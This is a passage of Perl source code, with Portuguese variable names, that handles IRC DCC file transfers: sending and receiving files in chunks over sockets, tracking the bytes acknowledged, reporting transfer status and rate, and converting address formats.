        $DCC{$fh}{status} = "Cancelado";
        $DCC{$fh}{ftime} = time;
        $dcc_sel->remove($fh);
        $fh->close;
        next;
     }
     if ($dcctipo eq "get") {
        $DCC{$fh}{curbyte} += length($msg);

        my $cur_byte = $DCC{$fh}{curbyte};

        open(FILE, ">> $arquivo");
        print FILE "$msg" if ($cur_byte <= $bytes);
        close(FILE);

        my $packbyte = pack("N", $cur_byte);
        print $fh "$packbyte";

        if ($bytes == $cur_byte) {
           $dcc_sel->remove($fh);
           $fh->close;
           $DCC{$fh}{status} = "Recebido";
           $DCC{$fh}{ftime} = time;
           next;
        }
     } elsif ($dcctipo eq "send") {
          my $send = $fh->accept;
          $send->autoflush(1);
          $dcc_sel->add($send);
          $dcc_sel->remove($fh);
          $DCC{$send}{tipo} = 'sendcon';
          $DCC{$send}{itime} = time;
          $DCC{$send}{nick} = $nick;
          $DCC{$send}{bytes} = $bytes;
          $DCC{$send}{curbyte} = 0;
          $DCC{$send}{arquivo} = $arquivo;
          $DCC{$send}{ip} = $send->peerhost;
          $DCC{$send}{porta} = $send->peerport;
          $DCC{$send}{status} = "Enviando";
          open(FILE, "< $arquivo");
          my $fbytes;
          read(FILE, $fbytes, 1024);
          print $send "$fbytes";
          close FILE;
#          delete($DCC{$fh});
     } elsif ($dcctipo eq 'sendcon') {
          my $bytes_sended = unpack("N", $msg);
          $DCC{$fh}{curbyte} = $bytes_sended;
          if ($bytes_sended == $bytes) {
             $fh->close;
             $dcc_sel->remove($fh);
             $DCC{$fh}{status} = "Enviado";
             $DCC{$fh}{ftime} = time;
             next;
          }
          open(SENDFILE, "< $arquivo");
          seek(SENDFILE, $bytes_sended, 0);
          my $send_bytes;
          read(SENDFILE, $send_bytes, 1024);
          print $fh "$send_bytes";
          close(SENDFILE);
     }
   }
}

sub SEND {
  my ($nick, $arquivo) = @_;
  unless (-r "$arquivo") {
    return(0);
  }
  my $dccark = $arquivo;
  $dccark =~ s/[.*\/](\S+)/$1/;
  my $meuip = $::irc_servers{"$::IRC_cur_socket"}{'meuip'};
  my $longip = unpack("N",inet_aton($meuip));
  my @filestat = stat($arquivo);
  my $size_total=$filestat[7];
  if ($size_total == 0) {
     return(0);
  }
  my ($porta, $sendsock);
  do {
    $porta = int rand(64511);
    $porta += 1024;
    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);
  } until $sendsock;
  $DCC{$sendsock}{tipo} = 'send';
  $DCC{$sendsock}{nick} = $nick;
  $DCC{$sendsock}{bytes} = $size_total;
  $DCC{$sendsock}{arquivo} = $arquivo;
  &::ctcp("$nick", "DCC SEND $dccark $longip $porta $size_total");
}
sub GET {
  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;
  return(0) if (-e "$arquivo");
  if (open(FILE, "> $arquivo")) {
     close FILE;
  } else {
    return(0);
  }
  my $dccip=fixaddr($dcclongip);
  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);
  my $dccsock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);
  $dccsock->autoflush(1);
  $dcc_sel->add($dccsock);
  $DCC{$dccsock}{tipo} = 'get';
  $DCC{$dccsock}{itime} = time;
  $DCC{$dccsock}{nick} = $nick;
  $DCC{$dccsock}{bytes} = $bytes;
  $DCC{$dccsock}{curbyte} = 0;
  $DCC{$dccsock}{arquivo} = $arquivo;
  $DCC{$dccsock}{ip} = $dccip;
  $DCC{$dccsock}{porta} = $dccporta;
  $DCC{$dccsock}{status} = "Recebendo";
}
sub Status {
  my $socket = shift;
  my $sock_tipo = $DCC{$socket}{tipo};
  unless (lc($sock_tipo) eq "chat") {
    my $nick = $DCC{$socket}{nick};
    my $arquivo = $DCC{$socket}{arquivo};
    my $itime = $DCC{$socket}{itime};
    my $ftime = time;
    my $status = $DCC{$socket}{status};
    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});

    my $d_time = $ftime-$itime;

    my $cur_byte = $DCC{$socket}{curbyte};
    my $bytes_total =  $DCC{$socket}{bytes};

    my $rate = 0;
    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;
    my $porcen = ($cur_byte*100)/$bytes_total;

    my ($r_duv, $p_duv);
    if ($rate =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $r_duv = $3; $r_duv++ if $4 >= 5;
       $rate = "$1\.$2"."$r_duv";
    }
    if ($porcen =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $p_duv = $3; $p_duv++ if $4 >= 5;
       $porcen = "$1\.$2"."$p_duv";
    }
    return("$sock_tipo","$status","$nick","$arquivo","$bytes_total", "$cur_byte","$d_time", "$rate", "$porcen");
  }
  return(0);
}

sub fixaddr {
    my ($address) = @_;

    chomp $address;
    if ($address =~ /^\d+$/) {
        return inet_ntoa(pack "N", $address);
    } elsif ($address =~ /^[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}$/) {
        return $address;
    } elsif ($address =~ tr/a-zA-Z//) {
        return inet_ntoa(((gethostbyname($address))[4])[0]);
    } else {
        return;
    }
}